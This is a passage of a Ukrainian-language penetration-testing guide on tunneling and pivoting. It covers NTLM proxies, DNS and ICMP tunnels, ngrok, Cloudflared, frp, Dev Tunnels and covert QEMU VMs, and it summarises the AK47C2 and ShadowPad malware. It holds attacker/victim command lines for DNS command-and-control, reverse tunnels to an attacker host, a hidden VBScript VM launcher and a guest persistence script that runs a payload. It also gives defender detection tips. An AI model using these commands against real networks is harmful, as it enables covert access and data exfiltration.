За допомогою [**Proxifier**](https://www.proxifier.com/) можна налаштувати GUI-застосунки Windows для роботи через проксі.<sup>[[26]](#references)</sup>\
У розділі **Profile -> Proxy Servers** додайте IP-адресу й порт SOCKS-сервера.\
У розділі **Profile -> Proxification Rules** додайте назву програми, яку потрібно спрямувати через проксі, і підключення до IP-адрес, для яких потрібно налаштувати проксі; правила Proxifier можуть зіставляти програми, цільові хости й порти.<sup>[[27]](#references)</sup>

## Тунелювання через NTLM-проксі

Згаданий раніше інструмент **Rpivot** може пересилати трафік через проксі з автентифікацією NTLM. **OpenVPN** також може спрямовувати трафік через такий проксі, якщо налаштувати файл автентифікації та метод NTLMv2; це проходження через проксі, а не обхід автентифікації проксі.<sup>[[20]](#references)[[28]](#references)</sup>

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm автентифікується на upstream NTLM-проксі, відкриває локальні порти прослуховування та може зіставити локальний порт тунелю зі службою призначення; клієнти можуть використовувати цей локальний порт.<sup>[[29]](#references)</sup>\
Наприклад, переспрямувати порт 443

```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

Тепер, якщо, наприклад, налаштувати службу **SSH** на victim так, щоб вона прослуховувала порт 443, до неї можна підключитися через порт 2222 на attacker.<sup>[[29]](#references)</sup>\
Також можна використати **meterpreter**, який підключається до localhost:443, поки attacker прослуховує порт 2222.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) — це набір інструментів Microsoft для .NET, призначений для роботи з reverse-proxy. Його можна знайти тут: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine створює IPv4-тунель через DNS-запити та використовує інтерфейси TUN; задокументоване налаштування потребує на обох кінцях прав, необхідних для створення цих інтерфейсів.<sup>[[31]](#references)</sup>

```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

DNS-транспорт має більші накладні витрати, ніж прямий TCP, і зазвичай працює повільно; через цей тунель можна створити стиснене SSH-з’єднання за допомогою:<sup>[[31]](#references)</sup>

```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

[**Завантажте його звідси**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 створює зашифрований канал керування та контролю через DNS; команди сервера й клієнта нижче відповідають задокументованому способу використання.<sup>[[32]](#references)</sup>

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```

#### **In PowerShell**

Ви можете використовувати [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell), щоб запустити клієнт dnscat2 у PowerShell; у його README описано параметри `Start-Dnscat2`, показані нижче.<sup>[[33]](#references)</sup>

```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```

#### **Переадресація портів за допомогою dnscat**

Інтерактивна команда `listen` у dnscat2 зіставляє локальний слухач із віддаленим хостом і портом.<sup>[[32]](#references)</sup>

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Зміна DNS у proxychains

Proxychains-ng перехоплює динамічно зв’язані TCP-з’єднання й не може передавати UDP або ICMP; проксіювання DNS можна налаштувати, тому перевірте встановлений `proxychains.conf` і допоміжний резолвер замість того, щоб вважати, що використовується фіксований публічний резолвер. Застарілі скрипти `proxyresolv` надають змінну `PROXY_DNS_SERVER` для вибору резолвера; якщо потрібні внутрішні імена, використовуйте резолвер, доступний із pivot.<sup>[[34]](#references)[[35]](#references)</sup>

## Тунелі в Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Власний DNS TXT / HTTP JSON C2 (AK47C2)

Актор Storm-2603 створив **двоканальний C2 («AK47C2»)**, який використовує *лише* вихідний трафік **DNS** і **звичайні HTTP POST-запити** — два протоколи, які корпоративні мережі рідко блокують.<sup>[[2]](#references)</sup>

1. **Режим DNS (AK47DNS)**
   • Генерує випадковий 5-символьний SessionID (наприклад, `H4T14`).  
   • Додає на початок `1` для *запитів на отримання завдань* або `2` для *результатів* і об’єднує різні поля (прапорці, SessionID, ім’я комп’ютера).  
   • Кожне поле **шифрується XOR із ключем ASCII `VHBD@H`**, кодується у шістнадцятковому форматі та з’єднується крапками — і в кінці додається домен, контрольований зловмисником:

   ```text
   <1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
   ```

   • Запити використовують `DnsQuery()` для записів **TXT** (і резервних записів **MG**).  
   • Якщо відповідь перевищує 0xFF байтів, backdoor **фрагментує** дані на частини по 63 байти та вставляє маркери:
     `s<SessionID>t<TOTAL>p<POS>`, щоб C2-сервер міг відновити їхній порядок.

2. **Режим HTTP (AK47HTTP)**
   • Формує JSON-конверт:
   ```json
   {"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
   ```
   • Увесь blob проходить через XOR-`VHBD@H` → hex → надсилається в тілі **`POST /`** із заголовком `Content-Type: text/plain`.
   • Відповідь використовує те саме кодування, а поле `cmd` виконується за допомогою `cmd.exe /c <command> 2>&1`.

Нотатки Blue Team
• Шукайте незвичні **TXT-запити**, перша мітка яких містить довгий hex-рядок і які завжди закінчуються одним рідкісним доменом.
• Стала XOR-ключка, за якою йде ASCII-hex, легко виявляється за допомогою YARA: `6?56484244?484` (`VHBD@H` у hex).
• Для HTTP позначайте POST-запити з `text/plain`, тіла яких складаються лише з hex-символів і мають парну кількість байтів.

{{#note}}
Канал дотримується обмеження DNS у 63 октети для кожної мітки субдомену, але відповідність протоколу сама по собі не робить його непомітним; рідкісні домени, довгі hex-мітки та обсяг запитів залишаються сигналами для виявлення.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP-тунелювання

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

У документації Hans описано тунель IPv4-over-ICMP, що використовує пристрій TUN і ICMP echo-запити; для налаштування потрібні права, достатні для створення інтерфейсу.<sup>[[37]](#references)</sup>

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

### ptunnel-ng

[**Завантажте його тут**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng передає TCP-з’єднання через ICMP і використовує наведені нижче параметри `-p`, `-l`, `-r` і `-R` для proxy, локального слухача, цільового хоста й цільового порту відповідно.<sup>[[38]](#references)</sup>

```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```

## ngrok

[**ngrok**](https://ngrok.com/) — це агент для надання локальних мережевих служб в інтернет через захищений тунель; у документації його CLI описані HTTP-, TCP- і файлові URL-кінцеві точки, а ім’я хоста кінцевої точки, яке виводиться, може відрізнятися залежно від кінцевої точки та облікового запису.<sup>[[39]](#references)</sup>

### Встановлення

- Створіть обліковий запис: https://ngrok.com/signup
- Завантаження клієнта:

```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```

### Базове використання

**Документація:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_За потреби агент також підтримує параметри автентифікації та TLS.<sup>[[39]](#references)</sup>_

#### Tunneling TCP

```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```

#### Публікація файлів через HTTP

```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```

#### Sniffing HTTP-викликів

_Корисно для XSS,SSRF,SSTI ..._\
Автономний агент за замовчуванням надає інтерфейс перевірки HTTP за адресою `http://127.0.0.1:4040`; цей інтерфейс призначений для HTTP-трафіку.<sup>[[40]](#references)</sup>

#### Тунелювання внутрішнього HTTP-сервісу

Параметр `--host-header=rewrite` переписує upstream-заголовок HTTP `Host`, щоб він відповідав локальному сервісу.<sup>[[41]](#references)</sup>

```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```

#### Простий приклад конфігурації ngrok.yaml

Тут використовується ngrok Agent Config v2; для іменованих тунелів задаються `proto` і `addr`, а запускаються вони командою `ngrok start`.<sup>[[42]](#references)</sup> Відкриває 3 тунелі:

- 2 TCP
- 1 HTTP з публікацією статичних файлів із /tmp/httpbin/

```yaml
version: 2
tunnels:
  mytcp:
    addr: 4444
    proto: tcp
  anothertcp:
    addr: 5555
    proto: tcp
  httpstatic:
    proto: http
    addr: file:///tmp/httpbin/
```

## Microsoft Dev Tunnels

Microsoft Dev Tunnels можуть публікувати локальний сервіс на базі TCP через ретрансляторну інфраструктуру Microsoft. CLI на хості створює вихідний тунель, а `devtunnel connect` відтворює опублікований порт на клієнті; за замовчуванням для тунелів потрібна автентифікація, якщо контроль доступу навмисно не послаблено.<sup>[[55]](#references)[[58]](#references)</sup>

```bash
# Compromised/pivot host: publish its local RDP service
# Save the tunnel ID printed by this command
devtunnel host -p 3389

# Operator host: authenticate as an authorized tunnel user and create
# a local 127.0.0.1:3389 forward to the hosted port
devtunnel connect <TUNNEL_ID>
xfreerdp /u:<USER> /v:127.0.0.1:3389
```

Це може надати доступ до RDP через `*.devtunnels.ms`, не відкриваючи новий вхідний порт на периметрі. Це також можна поєднати з тунелем віртуального каналу RDP, як-от `rdp2tcp`, перетворивши сеанс RDP на pivot другого етапу для довільного TCP-трафіку.<sup>[[58]](#references)</sup>

Для виявлення корелюйте запуск Dev Tunnels CLI з DNS/TLS-трафіком до `*.devtunnels.ms` і неочікуваними подіями віртуального каналу RDP. Автентифікований тунель не є безпечним лише тому, що він використовує ретранслятор Microsoft.<sup>[[58]](#references)</sup>

## Cloudflared (Cloudflare Tunnel)

Конектор `cloudflared` для Cloudflare Tunnel встановлює вихідні з’єднання; опубліковані застосунки можуть маршрутизувати HTTP, HTTPS, TCP, SSH і RDP, тоді як quick tunnels призначені для розробки HTTP.<sup>[[43]](#references)[[45]](#references)</sup>

### Однорядкова команда quick tunnel

```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```

### Походження SOCKS5 (застарілий режим)

Прапорець `--socks5` у застарілому режимі вказує `cloudflared`, що локальне джерело підтримує SOCKS5; він не створює локальний SOCKS5-слухач. Для керованого тунелю параметр `originRequest.proxyType: socks` налаштовує обробку SOCKS5-джерела.<sup>[[44]](#references)</sup>

```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```

### Постійні тунелі з DNS

У локально керованій конфігурації тунелю використовуються ключі `tunnel`, `credentials-file` і `url` у нижньому регістрі, як показано нижче.<sup>[[46]](#references)</sup>

```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```

Запустіть конектор:

```bash
cloudflared tunnel run mytunnel
```

Конектор встановлює вихідні з’єднання та за замовчуванням узгоджує QUIC із переходом на HTTP/2 у разі невдачі; не припускайте, що в кожному розгортанні використовується TCP/443. Запускайте його лише з привілеями, потрібними для вашого розгортання.<sup>[[43]](#references)[[47]](#references)</sup>

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) — це reverse proxy на Go з підтримкою **TCP, UDP, HTTP/S, STCP/SUDP, TCPMUX і XTCP**. XTCP використовує P2P-пробивання NAT, успіх якого залежить від NAT. Починаючи з **v0.53.0**, він може працювати як **SSH Tunnel Gateway**, тож цільовий хост може використовувати стандартний клієнт OpenSSH без бінарного файла `frpc`.<sup>[[48]](#references)[[49]](#references)[[50]](#references)</sup>

### Класичний зворотний TCP-тунель

```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```

### Використання нового SSH-шлюзу (без бінарного файлу frpc)

```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```

Наведена вище команда публікує порт жертви **8080** як **attacker_ip:9000** за допомогою стандартного клієнта OpenSSH, тоді як `frps` забезпечує шлюз.<sup>[[50]](#references)</sup>

## UDP back-connects за допомогою STUN

STUN Binding-запити, надіслані з UDP-сокета, можуть виявити його server-reflexive IP-адресу та порт, а періодичний трафік підтримує NAT-мапінг активним. Публічний STUN-сервер не є ретранслятором довільних керівних пакетів.<sup>[[60]](#references)</sup> У проаналізованій схемі back-connect використовувався той самий UDP-сокет для короткої керівної дейтаграми, після чого, отримавши тригер, система встановлювала *окреме вихідне TCP-з’єднання* для отримання та виконання команд.<sup>[[59]](#references)</sup>

Щоб отримати UDP-пакет від контролера, така схема все одно має передати йому дані про мапінг і відповідати політиці фільтрації NAT. Фільтрація, залежна від адреси або порту, може приймати відповіді від STUN-сервера, але відкидати пакети від іншого кінцевого вузла.<sup>[[60]](#references)[[61]](#references)</sup> Шлях rendezvous у проаналізованому backdoor не було перевірено, тому самі лише успішні відповіді STUN не доводять, що керівний канал доступний.<sup>[[59]](#references)</sup> Окремий протокол із явним rendezvous і резервним використанням relay описано в розділі [PPPP camera NAT traversal](../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md#nat-traversal-and-transport).

## Приховані тунелі на базі VM за допомогою QEMU

Для роботи QEMU у режимі користувацької мережі не потрібні root-права чи права адміністратора для віртуальної мережі, а `-netdev user,hostfwd=...` перенаправляє TCP-, UDP- або UNIX-з’єднання з хоста до guest.<sup>[[51]](#references)</sup> TrustedSec описала Tiny Core QEMU VM і спробу створити зворотний SSH-тунель під час інциденту, коли EDR, орієнтований на хост, міг не виявити активність усередині guest.<sup>[[1]](#references)</sup>

### Коротка однорядкова команда

```powershell
# Windows victim (user-mode networking; no TAP driver is needed for this example)
qemu-system-x86_64.exe ^
   -m 256M ^
   -drive file=tc.qcow2,if=ide ^
   -netdev user,id=n0,hostfwd=tcp::2222-:22 ^
   -device e1000,netdev=n0 ^
   -nographic
```

• Наведена вище команда запускає гостьову систему **Tiny Core Linux** із 256 MiB пам’яті та образом диска qcow2; образ диска не є диском у RAM.
• Порт **2222/tcp** на хості Windows прозоро перенаправляється на **22/tcp** усередині гостьової системи.  
• З погляду атакувальника ціль просто відкриває порт 2222; будь-які пакети, що надходять на нього, обробляє SSH-сервер, запущений у VM.

### Stealthy запуск через VBScript

TrustedSec зафіксувала запуск QEMU за допомогою VBS і використання образів Tiny Core в описаному вище інциденті.<sup>[[1]](#references)</sup>

```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```

Запуск скрипту за допомогою `cscript.exe //B update.vbs` залишає вікно прихованим.<sup>[[1]](#references)</sup>

### Закріплення в гостьовій системі

У згаданому інциденті описано закріплення в безстанній гостьовій системі Tiny Core за допомогою `/opt/bootlocal.sh` і `/opt/filetool.lst`:<sup>[[1]](#references)</sup>

1. Помістіть payload у `/opt/123.out`  
2. Додайте в кінець `/opt/bootlocal.sh`:

   ```sh
   while ! ping -c1 45.77.4.101; do sleep 2; done
   /opt/123.out
   ```

3. Додайте `home/tc` і `opt` до `/opt/filetool.lst`, щоб під час вимкнення payload було запаковано в `mydata.tgz`.

### Застереження щодо телеметрії

• На хості все ще видно процес QEMU, образ qcow2 і будь-який listener, перенаправлений хостом.  
• Сканування процесів лише на хості може не перевіряти процеси гостьової системи, але віртуалізація не гарантує ухилення від виявлення; мережна телеметрія, телеметрія QEMU та образів усе ще може його розкрити.<sup>[[1]](#references)[[51]](#references)</sup>

### Поради захисникам

• Налаштуйте сповіщення про **неочікувані бінарні файли QEMU/VirtualBox/KVM** у шляхах, доступних для запису користувачам.  
• Блокуйте вихідні з’єднання, що ініціюються `qemu-system*.exe`.  
• Перевіряйте рідкісні порти для прослуховування (2222, 10022, …), які починають прослуховуватися одразу після запуску QEMU.

## Вузли ретрансляції IIS/HTTP.sys через `HttpAddUrl` (ShadowPad)

Check Point описує модуль ShadowPad для IIS як засіб перетворення скомпрометованих периферійних вебсерверів на вузли бекдору й ретрансляції шляхом прив’язування префіксів URL через `HttpAddUrl`.<sup>[[3]](#references)</sup>

У тому самому звіті детально описано стандартні налаштування, wildcard-listener-и, розшифрування пакетів, черги ретрансляції та телеметрію налагодження, які підсумовано нижче.<sup>[[3]](#references)</sup>

* **Стандартні налаштування конфігурації** – якщо в JSON-конфігурації модуля немає певних значень, він використовує правдоподібні стандартні налаштування IIS (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Завдяки цьому IIS відповідає на легітимний трафік із відповідним брендингом.
* **Перехоплення wildcard-запитів** – оператори вказують список префіксів URL, розділених крапкою з комою (wildcard-символи в хості й шляху). Модуль викликає `HttpAddUrl` для кожного запису, тож HTTP.sys спрямовує відповідні запити до шкідливого обробника; запити, що не відповідають умовам, обробляються звичайним IIS.
* **Зашифрований перший пакет** – перші два байти тіла запиту містять seed для користувацького 32-бітного PRNG. Перед розбором протоколу кожен наступний байт XOR-иться зі згенерованим потоком ключа:

  ```python
  def decrypt_first_packet(buf):
      seed = buf[0] | (buf[1] << 8)
      num = seed & 0xFFFFFFFF
      out = bytearray(buf)
      for i in range(2, len(out)):
          hi = (num >> 16) & 0xFFFF
          num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
          out[i] ^= num & 0xFF
      return out
  ```

* **Оркестрація ретрансляції** — модуль підтримує два списки: «servers» (вузли upstream) і «clients» (downstream-імпланти). Записи видаляються, якщо протягом приблизно 30 секунд не надходить сигнал heartbeat. Коли обидва списки непорожні, модуль з’єднує перший справний сервер із першим справним клієнтом і просто передає байти між їхніми сокетами, доки одна зі сторін не закриє з’єднання.
* **Телеметрія налагодження** — необов’язкове журналювання фіксує IP-адреси джерела й призначення, а також загальну кількість пересланих байтів для кожного з’єднання. Дослідники використали ці сліди, щоб відтворити мережу ShadowPad, що охоплювала кількох жертв.

---

## Інші інструменти для перевірки

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Переховування в тінях: приховані тунелі через віртуалізацію QEMU](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research — До ToolShell: дослідження попередніх ransomware-операцій Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research — Усередині Ink Dragon: розкриття мережі ретрансляції та внутрішньої роботи прихованої наступальної операції](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [README Evil-WinRM](https://raw.githubusercontent.com/Hackplayers/evil-winrm/master/README.md)
- [5] [Довідник Nmap: обхід обмежень брандмауера/IDS](https://nmap.org/book/man-bypass-firewalls-ids.html)
- [6] [Посібник OpenBSD ssh](https://man.openbsd.org/ssh)
- [7] [Посібник OpenBSD sshd_config](https://man.openbsd.org/sshd_config)
- [8] [Примітки до випуску OpenSSH 9.6](https://www.openssh.org/txt/release-9.6)
- [9] [README sshuttle](https://raw.githubusercontent.com/sshuttle/sshuttle/master/README.rst)
- [10] [Metasploit: pivoting у Metasploit](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [11] [Документація модуля Metasploit socks_proxy](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/auxiliary/server/socks_proxy.md)
- [12] [Документація модуля Metasploit autoroute](https://raw.githubusercontent.com/rapid7/metasploit-framework/master/documentation/modules/post/multi/manage/autoroute.md)
- [13] [Cobalt Strike: SOCKS Proxy](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_socks-proxy.htm)
- [14] [Cobalt Strike: Reverse Port Forward](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/pivoting_reverse-port-forward.htm)
- [15] [README reGeorg](https://raw.githubusercontent.com/sensepost/reGeorg/master/README.md)
- [16] [README Chisel](https://raw.githubusercontent.com/jpillora/chisel/master/README.md)
- [17] [Короткий посібник Ligolo-ng](https://docs.ligolo.ng/Quickstart/)
- [18] [Слухачі Ligolo-ng](https://docs.ligolo.ng/Listeners/)
- [19] [Локальний хост Ligolo-ng](https://docs.ligolo.ng/Localhost/)
- [20] [README rpivot](https://raw.githubusercontent.com/klsecservices/rpivot/master/README.md)
- [21] [Посібник socat](https://man7.org/linux/man-pages/man1/socat.1.html)
- [22] [Посібник PuTTY Plink](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter7.html)
- [23] [Параметри командного рядка PuTTY](https://the.earth.li/~sgtatham/putty/0.84/htmldoc/Chapter3.html)
- [24] [Команда Microsoft netsh interface portproxy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface)
- [25] [README SocksOverRDP](https://raw.githubusercontent.com/nccgroup/SocksOverRDP/master/README.md)
- [26] [Документація Proxifier](https://www.proxifier.com/docs/win-v4/)
- [27] [Правила проксифікації Proxifier](https://www.proxifier.com/docs/win-v3/rules.htm)
- [28] [Посібник OpenVPN 2.7](https://openvpn.net/community-docs/community-articles/openvpn-2-7-manual.html)
- [29] [Cntlm](https://cntlm.sourceforge.net/)
- [30] [README YARP](https://raw.githubusercontent.com/dotnet/yarp/main/README.md)
- [31] [README iodine](https://code.kryo.se/iodine/README.html)
- [32] [README dnscat2](https://raw.githubusercontent.com/iagox86/dnscat2/master/README.md)
- [33] [README dnscat2-powershell](https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/README.md)
- [34] [README proxychains-ng](https://raw.githubusercontent.com/rofl0r/proxychains-ng/master/README)
- [35] [proxyresolv](https://github.com/haad/proxychains/blob/master/src/proxyresolv)
- [36] [RFC 1035: доменні імена — реалізація та специфікація](https://www.rfc-editor.org/rfc/rfc1035)
- [37] [Hans](https://code.gerade.org/hans/)
- [38] [README ptunnel-ng](https://raw.githubusercontent.com/utoni/ptunnel-ng/master/README.md)
- [39] [CLI агента ngrok](https://ngrok.com/docs/agent/cli)
- [40] [Вебінтерфейс інспекції ngrok](https://ngrok.com/docs/agent/web-inspection-interface)
- [41] [Віртуальні хости ngrok](https://ngrok.com/docs/using-ngrok-with/virtualHosts)
- [42] [Конфігурація агента ngrok v2](https://ngrok.com/docs/agent/config/v2)
- [43] [Огляд Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/)
- [44] [Параметри джерела Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/origin-parameters/)
- [45] [Налаштування Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/setup/)
- [46] [Файл конфігурації Cloudflare Tunnel](https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/local-management/configuration-file/)
- [47] [Параметри запуску Cloudflare Tunnel](https://developers.cloudflare.com/tunnel/advanced/run-parameters/)
- [48] [Основні поняття frp](https://gofrp.org/en/docs/concepts/)
- [49] [XTCP у frp](https://gofrp.org/en/docs/features/xtcp/)
- [50] [SSH Tunnel Gateway у frp](https://gofrp.org/en/docs/features/common/ssh/)
- [51] [Документація з мережевої взаємодії QEMU](https://www.qemu.org/docs/master/system/devices/net.html)
- [52] [README wstunnel](https://github.com/erebe/wstunnel/blob/main/README.md)
- [53] [Репозиторій вихідного коду NetSPI BOFScale](https://github.com/NetSPI/BOFscale)
- [54] [BOFScale: tailnet за CDN із BOF-PE](https://www.netspi.com/blog/technical-blog/red-teaming/bofscale-a-cdn-fronted-tailnet-from-a-bof-pe/)
- [55] [Microsoft Learn — команди CLI Dev Tunnels](https://learn.microsoft.com/en-us/azure/developer/dev-tunnels/cli-commands)
- [56] [V-E-O/rdp2tcp](https://github.com/V-E-O/rdp2tcp)
- [57] [Fortra Impacket — atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [58] [APT NightEagle: GhostContainer і тунелювання](https://securelist.com/tr/nighteagle-apt-ghostcontainer-and-tunneling/121323/)
- [59] [FortiGuard Labs — бекдор ClingSTUN для Linux зловживає загальнодоступною інфраструктурою STUN](https://www.fortinet.com/blog/threat-research/clingstun-linux-backdoor-abuses-public-stun-infrastructure)
- [60] [RFC 8489 — засоби обходу NAT для сеансів (STUN)](https://www.rfc-editor.org/rfc/rfc8489.html)
- [61] [RFC 4787 — вимоги до поведінки NAT для одноадресного UDP](https://www.rfc-editor.org/rfc/rfc4787.html)
- [62] [README Tailcat](https://github.com/tailscale/tailcat/blob/main/README.md)
- [63] [Malwarebytes — шкідливе ПЗ Kothamine використовує tailcat від Tailscale, щоб уникати виявлення в мережі](https://www.malwarebytes.com/blog/threat-intel/2026/09/kothamine-malware-uses-tailscales-tailcat-to-evade-network-detection)
{{#include ../banners/hacktricks-training.md}}
